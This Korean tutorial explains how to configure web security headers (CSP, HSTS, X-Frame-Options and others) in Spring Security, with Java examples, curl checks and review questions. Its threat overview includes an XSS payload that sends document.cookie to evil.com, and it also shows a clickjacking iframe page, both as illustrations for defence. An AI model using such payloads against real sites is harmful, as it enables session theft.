# Security Headers — CSP, HSTS, X-Frame-Options 구성

---

## 🎯 핵심 질문

이 문서를 읽고 나면 다음 질문에 답할 수 있습니다.

- `HeadersConfigurer`가 자동으로 추가하는 헤더 목록과 각 헤더의 역할은?
- `Content-Security-Policy`로 XSS를 방어하는 디렉티브를 어떻게 구성하는가?
- HSTS `max-age`와 `includeSubDomains` 설정이 적용되는 조건은?
- Spring Boot의 기본 보안 헤더 설정이 실제 응답에 어떻게 포함되는가?
- `X-Frame-Options`를 `DENY`에서 `SAMEORIGIN`으로 변경해야 하는 경우는?
- Content Security Policy `nonce` 방식과 `hash` 방식의 차이는?

---

## 🔍 왜 이 보안 메커니즘이 필요한가

### Security Headers가 방어하는 공격

```
보안 헤더 없는 경우 취약점:

  XSS (Cross-Site Scripting) 방어 → Content-Security-Policy
  공격: <script>fetch('https://evil.com?c='+document.cookie)</script>
  방어: Content-Security-Policy: script-src 'self'
  → 외부 스크립트 실행 차단, 인라인 스크립트 차단

  클릭재킹(Clickjacking) 방어 → X-Frame-Options / CSP frame-ancestors
  공격: 공격자 사이트에서 <iframe src="https://bank.com/transfer"> 위에 투명 레이어
  → 사용자가 실제로 클릭하는 것은 이체 버튼
  방어: X-Frame-Options: DENY → iframe 삽입 자체 차단

  HTTPS 강제 → Strict-Transport-Security (HSTS)
  공격: 사용자가 http://bank.com을 입력 → 공격자가 중간에서 가로채기
  방어: HSTS → 브라우저가 항상 HTTPS로만 접속

  MIME 스니핑 → X-Content-Type-Options
  공격: text/html 파일을 JavaScript로 실행
  방어: nosniff → 선언된 MIME 타입으로만 처리

  정보 노출 → Referrer-Policy
  방어: origin-when-cross-origin → 다른 사이트로 이동 시 경로 미전송
```

---

## 😱 흔한 보안 실수

### Before: Content-Security-Policy를 unsafe-inline으로 무력화

```java
// ❌ unsafe-inline 사용 → CSP 의미 없음
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives(
            "default-src 'self'; " +
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'") // ← XSS 허용
    )
);
// → 인라인 <script> 태그 허용 → XSS 공격자가 삽입한 스크립트 실행 가능

// ✅ nonce 기반으로 안전한 인라인 스크립트만 허용
// nonce: 요청마다 새 랜덤값 → 공격자가 예측 불가
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives(
            "default-src 'self'; " +
            "script-src 'self' 'nonce-{random}'; " + // 서버가 nonce 생성
            "style-src 'self' 'nonce-{random}'"
        )
    )
);
```

### Before: HSTS를 HTTP에서도 적용 시도

```java
// ❌ HSTS는 HTTPS에서만 의미가 있음
// HTTP로 응답에 HSTS 헤더를 보내도 브라우저가 무시
// 더 나쁘게는: HTTP만 사용하는 환경에서 HSTS 헤더 → 접속 불가 위험

// Spring Security 기본: HTTPS 요청에서만 HSTS 헤더 전송
// (RequestMatcher: SecureRequestMatcher = HTTPS 요청 감지)

// ✅ HTTPS 전환 후 HSTS 설정 (preload 포함)
http.headers(headers -> headers
    .httpStrictTransportSecurity(hsts -> hsts
        .maxAgeInSeconds(31536000) // 1년
        .includeSubDomains(true)
        .preload(true)             // hstspreload.org 등록 시
    )
);
// 처음에는 짧은 max-age로 테스트 후 점진적으로 늘릴 것
```

---

## ✨ 올바른 보안 구현

### Security Headers 완전 설정

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers

        // ① Content-Security-Policy
        .contentSecurityPolicy(csp -> csp
            .policyDirectives(
                "default-src 'self'; "
                + "script-src 'self' https://cdn.trusted.com; "
                + "style-src 'self' https://fonts.googleapis.com; "
                + "font-src 'self' https://fonts.gstatic.com; "
                + "img-src 'self' data: https:; "  // 이미지: 같은 출처 + data URI + HTTPS
                + "connect-src 'self' https://api.myapp.com; "  // XHR/Fetch 대상
                + "frame-ancestors 'none'; "         // iframe 삽입 금지 (X-Frame-Options 대체)
                + "base-uri 'self'; "                 // <base> 태그 자기 도메인만
                + "form-action 'self'"                // 폼 제출 자기 도메인만
            )
        )

        // ② HSTS (HTTPS 강제)
        .httpStrictTransportSecurity(hsts -> hsts
            .maxAgeInSeconds(31536000)  // 1년
            .includeSubDomains(true)    // 서브도메인도 적용
            // .preload(true)           // HSTS preload list 등록 시 추가
        )

        // ③ X-Frame-Options
        .frameOptions(frame -> frame.deny()) // DENY: 모든 iframe 금지
        // 또는: .frameOptions(frame -> frame.sameOrigin()) // 같은 도메인만 허용

        // ④ X-Content-Type-Options
        .contentTypeOptions(Customizer.withDefaults()) // nosniff (기본 활성화)

        // ⑤ Referrer-Policy
        .referrerPolicy(referrer -> referrer
            .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
        )

        // ⑥ Permissions-Policy (구 Feature-Policy)
        .permissionsPolicy(permissions -> permissions
            .policy("camera=(), microphone=(), geolocation=()")
            // 카메라, 마이크, 위치 정보 접근 차단
        )

        // ⑦ X-XSS-Protection (구형 브라우저용, 최신 브라우저는 CSP로 대체)
        .xssProtection(xss -> xss
            .headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)
        )
    );
    return http.build();
}
```

### Nonce 기반 CSP (동적 인라인 스크립트 허용)

```java
// 매 요청마다 새 nonce 생성 → Thymeleaf 템플릿에서 사용
@Component
public class ContentSecurityPolicyNonceFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request, ...) {
        // 요청마다 새 nonce 생성
        byte[] nonceBytes = new byte[16];
        new SecureRandom().nextBytes(nonceBytes);
        String nonce = Base64.getEncoder().encodeToString(nonceBytes);

        // request 속성에 저장 → Thymeleaf에서 접근 가능
        request.setAttribute("cspNonce", nonce);

        chain.doFilter(request, response);
    }
}

// SecurityConfig에서 nonce를 포함한 CSP 헤더 동적 생성:
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives(buildCspWithNonce(request))
        )
    );
    return http.build();
}

// Thymeleaf 사용:
// <script th:nonce="${cspNonce}">
//   // 이 스크립트만 허용 (nonce 일치 시)
//   initApp();
// </script>
//
// CSP 헤더:
// Content-Security-Policy: script-src 'self' 'nonce-abc123xyz=='
```

---

## 🔬 내부 동작 원리

### 1. Spring Security 기본 보안 헤더 (HeadersConfigurer 기본값)

```java
// http.headers() 기본 활성화 헤더 목록:

// ① X-Content-Type-Options: nosniff
//    → MIME 스니핑 방지 (JavaScript로 실행될 수 없는 파일 형식 보호)
//    → 기본 활성화

// ② X-Frame-Options: DENY
//    → 클릭재킹 방지 (iframe 삽입 차단)
//    → 기본 활성화

// ③ Strict-Transport-Security: max-age=31536000; includeSubDomains
//    → HTTPS 강제 (HTTPS 요청에서만 전송)
//    → 기본 활성화 (max-age=31536000)

// ④ X-XSS-Protection: 1; mode=block
//    → 구형 IE/Chrome의 XSS 필터 활성화
//    → 기본 활성화 (최신 브라우저는 CSP로 대체)

// ⑤ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
//    → 인증된 응답 캐시 방지
//    → 기본 활성화

// ⑥ Pragma: no-cache
//    → HTTP/1.0 호환 캐시 방지
//    → 기본 활성화

// ⑦ Expires: 0
//    → 즉시 만료
//    → 기본 활성화

// Content-Security-Policy: 기본 비활성화 (직접 설정 필요)
// Referrer-Policy: 기본 비활성화 (직접 설정 필요)
// Permissions-Policy: 기본 비활성화 (직접 설정 필요)
```

### 2. HeaderWriterFilter — 헤더 추가 메커니즘

```java
// HeaderWriterFilter.java
public class HeaderWriterFilter extends OncePerRequestFilter {

    private final List<HeaderWriter> headerWriters;

    @Override
    protected void doFilterInternal(HttpServletRequest request, ...) {
        chain.doFilter(request, new HeaderWriterResponse(response, headerWriters));
        // 응답에 헤더를 추가하는 래핑 응답 객체 사용
    }
}

// 각 HeaderWriter 구현:
// XContentTypeOptionsHeaderWriter: X-Content-Type-Options: nosniff
// XXssProtectionHeaderWriter:      X-XSS-Protection: 1; mode=block
// HstsHeaderWriter:                Strict-Transport-Security: ...
//   → SecureRequestMatcher: request.isSecure()가 true일 때만 적용
//   → HTTPS 요청에서만 HSTS 헤더 전송
// XFrameOptionsHeaderWriter:       X-Frame-Options: DENY
// CacheControlHeadersWriter:       Cache-Control, Pragma, Expires
```

### 3. CSP 디렉티브 구성 가이드

```
default-src 'self':
  → 모든 리소스의 기본 정책: 같은 출처에서만 로드
  → script-src 등 개별 지정 없으면 default-src를 따름

script-src 'self' 'nonce-{value}':
  → 스크립트: 같은 출처 + nonce 일치하는 인라인 스크립트만
  → 'unsafe-inline': 금지 (XSS 허용)
  → 'unsafe-eval': 금지 (eval() 허용 → 취약)

style-src 'self' 'nonce-{value}':
  → CSS: 같은 출처 + nonce 일치하는 인라인 스타일만

img-src 'self' data: https:
  → 이미지: 같은 출처 + data URI + HTTPS 어디서나

connect-src 'self' https://api.myapp.com:
  → XHR, Fetch: 같은 출처 + 명시된 API 서버

frame-ancestors 'none':
  → 이 페이지를 iframe으로 삽입 금지 (X-Frame-Options: DENY와 동일)
  → 최신 CSP 권장 방식 (X-Frame-Options는 구형)

report-uri /csp-report:
  → CSP 위반 시 이 URL에 JSON 보고서 전송
  → 위반 모니터링에 활용

Content-Security-Policy-Report-Only:
  → 위반 시 차단 없이 보고서만 전송 (배포 전 테스트용)
  → 점진적 CSP 적용 시 사용
```

### 4. HSTS 적용 조건과 단계별 설정

```
HSTS 적용 조건:
  1. HTTPS 요청에서만 전송 (Spring Security: isSecure() check)
  2. 브라우저가 이 헤더를 받으면 max-age 동안 HTTPS만 사용
  3. preload: hstspreload.org에 사이트 등록 → 브라우저에 하드코딩

단계별 HSTS 도입:
  1단계: max-age=300 (5분) → 짧게 시작, 문제 없으면 연장
  2단계: max-age=86400 (1일) → 정상 확인 후
  3단계: max-age=2592000 (30일) → includeSubDomains 추가
  4단계: max-age=31536000 (1년) → preload 추가
  → 한 번 설정하면 max-age 동안 HTTP로 돌아갈 수 없음
     (HSTS 삭제 전에 max-age를 0으로 먼저 줄여야 함)

주의:
  includeSubDomains: true → 모든 서브도메인도 HTTPS 필요
  → 서브도메인 중 HTTP만 지원하는 것이 있으면 접근 불가
  preload: 브라우저 소스 코드에 포함 → 제거가 매우 어려움
  → 완전히 준비된 후에만 preload 설정
```

---

## 💻 실험으로 확인하기

### 실험 1: 기본 보안 헤더 확인

```bash
curl -I http://localhost:8080/api/orders \
  -H "Authorization: Bearer validToken" | grep -E "X-|Strict|Cache|Pragma"

# 기대 출력:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# X-XSS-Protection: 1; mode=block
# Strict-Transport-Security: max-age=31536000 ; includeSubDomains  ← HTTPS에서만
# Cache-Control: no-cache, no-store, max-age=0, must-revalidate
# Pragma: no-cache
# Expires: 0
```

### 실험 2: CSP 위반 감지 (Report-Only)

```java
// 배포 전 CSP 테스트: Report-Only 모드
http.headers(headers -> headers
    .addHeaderWriter(new StaticHeadersWriter(
        "Content-Security-Policy-Report-Only",
        "default-src 'self'; " +
        "script-src 'self'; " +
        "report-uri /api/csp-report"
    ))
);

// CSP 위반 수신 엔드포인트
@PostMapping("/api/csp-report")
public ResponseEntity<Void> cspReport(
        @RequestBody Map<String, Object> report) {
    log.warn("[CSP-VIOLATION] {}", report.get("csp-report"));
    return ResponseEntity.noContent().build();
}
// → 위반 시 차단 없이 로그만 기록 → 실제 적용 전 검증
```

### 실험 3: X-Frame-Options 클릭재킹 테스트

```html
<!-- evil.com의 공격 시도 -->
<html>
<body>
  <iframe src="https://mybank.com/transfer" style="opacity:0"></iframe>
  <button onclick="steal()">무료 선물 받기</button>
</body>
</html>

<!-- X-Frame-Options: DENY 적용 시 -->
<!-- 브라우저: "mybank.com refused to connect" -->
<!-- iframe 로드 자체 차단 → 클릭재킹 불가 -->
```

---

## 🔒 보안 체크리스트

```
Content-Security-Policy
  ☐ default-src 'self' 기본 설정
  ☐ unsafe-inline, unsafe-eval 절대 금지
  ☐ 외부 CDN: 특정 URL만 명시 (와일드카드 최소화)
  ☐ 배포 전 Report-Only로 위반 확인
  ☐ nonce 사용 시 요청마다 새 값 생성 (SecureRandom)

HSTS
  ☐ HTTPS 완전 전환 후 적용
  ☐ max-age 점진적 증가 (300 → 86400 → 31536000)
  ☐ includeSubDomains 전 모든 서브도메인 HTTPS 확인
  ☐ preload는 충분히 준비된 후 (되돌리기 매우 어려움)

X-Frame-Options
  ☐ 기본값 DENY 유지
  ☐ 같은 출처 iframe 필요 시 SAMEORIGIN
  ☐ frame-ancestors CSP 디렉티브로 대체 권장 (더 세밀한 제어)

기타 헤더
  ☐ X-Content-Type-Options: nosniff (기본 활성화 확인)
  ☐ Referrer-Policy: strict-origin-when-cross-origin
  ☐ Permissions-Policy로 불필요한 브라우저 API 차단
```

---

## 🤔 트레이드오프

```
strict CSP vs 개발 편의성:
  strict (unsafe 없음):
    장점  XSS 방어 최대화
    단점  인라인 스크립트/스타일 모두 교체 필요
          레거시 코드 마이그레이션 비용

  Report-Only 방식:
    장점  기존 코드 영향 없이 위반 파악
    단점  차단 효과 없음 (모니터링 전용)
    → 점진적 도입: Report-Only → 위반 수정 → Enforcement

X-Frame-Options: DENY vs SAMEORIGIN:
  DENY:
    장점  클릭재킹 완전 차단
    단점  같은 도메인 내 iframe도 차단
    → 로그인 페이지, 결제 페이지에 적합

  SAMEORIGIN:
    장점  같은 출처의 iframe 허용 (내부 포탈, 대시보드)
    단점  공격자가 같은 출처에서 iframe 생성 시 취약
    → 내부 앱 통합이 필요한 경우

HSTS max-age 길이:
  짧음 (300초): 빠른 HTTPS 회귀 가능, 보안 약함
  1년:          강력한 HTTPS 강제, 문제 발생 시 회귀 불가
```

---

## 📌 핵심 정리

```
기본 활성화 헤더 (Spring Security)
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  X-XSS-Protection: 1; mode=block
  Strict-Transport-Security: max-age=31536000; includeSubDomains (HTTPS에서)
  Cache-Control / Pragma / Expires

직접 설정 필요 헤더
  Content-Security-Policy: XSS 방어 (unsafe-inline 금지)
  Referrer-Policy: 정보 노출 최소화
  Permissions-Policy: 브라우저 API 접근 제한

CSP 핵심 원칙
  default-src 'self' 시작
  unsafe-inline, unsafe-eval 금지
  인라인 스크립트: nonce 방식으로 허용
  배포 전 Report-Only로 검증

HSTS 적용 순서
  HTTPS 완전 전환 → 짧은 max-age 테스트 → 점진적 증가
  includeSubDomains 전 서브도메인 HTTPS 확인
  preload는 마지막 단계
```

---

## 🤔 생각해볼 문제

**Q1.** `Content-Security-Policy`에서 `nonce` 방식을 사용할 때, Thymeleaf 서버사이드 렌더링에서는 nonce를 쉽게 삽입할 수 있습니다. 하지만 React, Vue 같은 SPA(정적 HTML + JS 번들)에서 인라인 스크립트에 nonce를 적용하려면 어떻게 해야 하는가?

**Q2.** `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`를 설정한 후 운영 도중 특정 서브도메인을 HTTP로 마이그레이션해야 하는 상황이 발생했습니다. HSTS 설정이 이미 브라우저에 캐시됐다면 어떻게 해결하는가?

**Q3.** `Content-Security-Policy`를 `default-src 'self'`로만 설정한 경우, Google Analytics 스크립트를 로드하고 데이터를 전송하는 기존 코드가 있다면 구체적으로 어떤 CSP 디렉티브를 추가해야 하는가? 그리고 이 추가로 인한 보안 트레이드오프는?

> 💡 **해설**
>
> **Q1.** SPA에서는 정적 빌드된 JS 파일이 서버에서 nonce를 미리 알 수 없습니다. 해결 방법으로는 첫째, 빌드 시 nonce 자리표시자를 삽입하고 서버에서 응답할 때 동적으로 교체하는 방법이 있습니다. 둘째, 더 현실적인 방법은 번들러(Webpack, Vite)의 모든 JS를 외부 파일로 분리해 인라인 스크립트를 없애는 것입니다. `script-src 'self'`만으로 외부 JS 파일을 허용하므로 nonce가 불필요합니다. 셋째, Service Worker나 SSR(Next.js, Nuxt)을 사용해 서버에서 nonce를 HTML에 삽입합니다. 실무에서는 SPA의 인라인 스크립트를 최소화하고 번들러 출력을 외부 파일로만 구성하는 것이 권장됩니다.
>
> **Q2.** HSTS가 브라우저에 캐시된 경우 해당 서브도메인의 HTTP 접속이 브라우저에서 자동으로 HTTPS로 리다이렉트됩니다. 즉시 해결은 불가합니다. 단계적 해결 방법: 먼저 HSTS `max-age`를 0으로 변경한 응답을 전송해 브라우저가 다음 방문 시 HSTS를 클리어하도록 합니다(`Strict-Transport-Security: max-age=0`). 사용자에게 브라우저 HSTS 캐시 수동 삭제를 안내합니다(Chrome: `chrome://net-internals/#hsts`). `includeSubDomains`를 제거한 HSTS를 유지하면 해당 서브도메인만 HSTS에서 제외됩니다. 이 때문에 HSTS preload 등록은 매우 신중하게 해야 합니다.
>
> **Q3.** Google Analytics를 위한 추가 CSP 디렉티브: `script-src 'self' https://www.googletagmanager.com https://www.google-analytics.com;`, `img-src 'self' https://www.google-analytics.com;`, `connect-src 'self' https://www.google-analytics.com;`. 보안 트레이드오프: 외부 도메인(googletagmanager.com, google-analytics.com)을 명시적으로 허용함으로써 그 도메인이 악용되거나 해킹된 경우 연쇄적으로 영향을 받을 수 있습니다(Supply Chain Attack). Google Tag Manager는 특히 위험한데, GTM에서 임의의 스크립트를 로드할 수 있어 `script-src https://www.googletagmanager.com`을 허용하면 GTM을 통해 어떤 스크립트든 실행 가능합니다. 보안 강화 방법으로는 Google Analytics 4의 서버사이드 측정(Measurement Protocol)으로 클라이언트에서 GA 스크립트를 제거하거나, Plausible, Fathom 같은 개인정보 보호 분석 도구로 교체하는 것을 고려합니다.

---

<div align="center">

**[← 이전: CORS Configuration](./01-cors-configuration.md)** | **[홈으로 🏠](../README.md)** | **[다음: Security Events & Listeners ➡️](./03-security-events.md)**

</div>
